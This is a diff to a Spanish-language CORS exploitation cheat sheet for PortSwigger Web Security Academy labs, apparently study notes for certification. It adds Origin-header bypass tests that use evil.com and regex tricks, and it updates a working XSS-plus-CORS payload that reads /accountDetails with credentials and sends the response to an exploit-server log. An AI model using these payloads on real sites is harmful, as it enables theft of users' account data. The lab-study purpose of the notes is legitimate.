@@ -10,6 +10,20 @@ Cheat Sheet:
 	- Origin: normal-website.com.evil-user.net
 
 ---
+
+1. **Prueba de Origen Arbitrario:** Añade la cabecera `Origin: [https://evil.com](https://evil.com)`. Busca que la respuesta devuelva `Access-Control-Allow-Origin: [https://evil.com](https://evil.com)` y la cabecera de credenciales a `true`.
+    
+2. **Prueba de Origen Nulo:** Cambia la cabecera a `Origin: null`. Muchos desarrolladores lo configuran así por error para intentar solucionar problemas con iframes locales o sandboxes.
+    
+3. **Prueba de Subdominios:** Envía `Origin: [https://hacker.dominio-objetivo.com](https://hacker.dominio-objetivo.com)`. Si la aplicación lo acepta, confirma que confía en comodines (`*`). Para explotarlo, necesitarás encontrar un XSS en cualquier subdominio o un _Subdomain Takeover_.
+    
+4. **Prueba de Sufijo (Bypass de Regex):** Intenta engañar la validación del servidor añadiendo tu dominio al final: `Origin: [https://dominio-objetivo.com.evil.com](https://dominio-objetivo.com.evil.com)`.
+    
+5. **Prueba de Prefijo (Bypass de Regex):** Intenta modificar el inicio del dominio para ver si la expresión regular está mal anclada: `Origin: [https://evildominio-objetivo.com](https://evildominio-objetivo.com)`.
+    
+6. **Prueba de Protocolo (HTTP):** Envía `Origin: [http://dominio-objetivo.com](http://dominio-objetivo.com)` (sin la 's'). Si el servidor permite HTTP, asume un riesgo de seguridad en texto plano, lo cual abre la puerta a vectores de red (aunque es menos común explotarlo en la certificación de PortSwigger).
+
+---
 ##### CORS Template
 
 *  `/AccountDetails`
@@ -103,7 +117,7 @@ function reqListener() {
 //PAYLOAD FINAL: 
 //(Todo el script payload de ?productId=<script>...debe ser fielmente encoded to URL)
 <script>
-    document.location="http://stock.0a6800840430dbb282bd5cdc00210093.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a6800840430dbb282bd5cdc00210093.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a2800680416dbf0823c5ba001ef0005.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+    document.location="http://stock.0acd00d504c52e7680f55318003a009b.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0acd00d504c52e7680f55318003a009b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a6c003204252e8f808252ee019e002d.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 
 ```
